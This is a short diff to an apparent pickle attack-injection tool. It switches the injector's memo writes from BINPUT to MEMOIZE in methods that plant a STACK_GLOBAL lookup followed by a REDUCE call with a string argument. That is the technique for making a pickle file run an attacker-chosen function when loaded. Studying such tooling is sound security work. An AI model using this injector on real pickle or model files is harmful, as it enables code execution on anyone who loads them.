@@ -14,6 +14,7 @@ BINGET = 46
 LONG_BINGET = 47
 BINPUT = 49
 LONG_BINPUT = 50
+MEMOIZE = 51
 GLOBAL = 55
 STACK_GLOBAL = 56
 REDUCE = 57
@@ -191,7 +192,7 @@ class AttackInjector():
         AttackInjector.write_binunicode(None, out_pickle, module_name)            # SHORT_BINUNICODE       <module_name>
         AttackInjector.write_binunicode(None, out_pickle, qualname)               # SHORT_BINUNICODE       <module_name>
         AttackInjector.write_simple_opcode(None, out_pickle, STACK_GLOBAL)        # STACK_GLOBAL
-        AttackInjector.write_put(last_memo_index + 1, out_pickle)                 # BINPUT/LONG_BINPUT     N + 1
+        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
         AttackInjector.write_simple_opcode(None, out_pickle, POP)                 # POP
 
         return 1
@@ -201,14 +202,14 @@ class AttackInjector():
         AttackInjector.write_binunicode(None, out_pickle, module_name)            # SHORT_BINUNICODE       <module_name>
         AttackInjector.write_binunicode(None, out_pickle, qualname)               # SHORT_BINUNICODE       <module_name>
         AttackInjector.write_simple_opcode(None, out_pickle, STACK_GLOBAL)        # STACK_GLOBAL
-        AttackInjector.write_put(last_memo_index + 1, out_pickle)    # BINPUT/LONG_BINPUT     N + 1
-        AttackInjector.write_binunicode(None, out_pickle, arg_str)   # BINUNICODE             <arg_str>
-        AttackInjector.write_put(last_memo_index + 2, out_pickle)    # BINPUT/LONG_BINPUT     N + 2
-        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1) # TUPLE1
-        AttackInjector.write_put(last_memo_index + 3, out_pickle)    # BINPUT/LONG_BINPUT     N + 3
-        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE) # REDUCE
-        AttackInjector.write_put(last_memo_index + 4, out_pickle)    # BINPUT/LONG_BINPUT     N + 4
-        AttackInjector.write_simple_opcode(None, out_pickle, POP)    # POP
+        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
+        AttackInjector.write_binunicode(None, out_pickle, arg_str)                # BINUNICODE             <arg_str>
+        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
+        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1)              # TUPLE1
+        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
+        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE)              # REDUCE
+        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
+        AttackInjector.write_simple_opcode(None, out_pickle, POP)                 # POP
 
         return 4
 
